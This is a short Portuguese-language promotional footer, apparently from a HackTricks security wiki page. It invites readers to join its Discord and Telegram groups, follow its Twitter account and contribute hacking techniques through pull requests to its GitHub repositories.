* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga** me no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
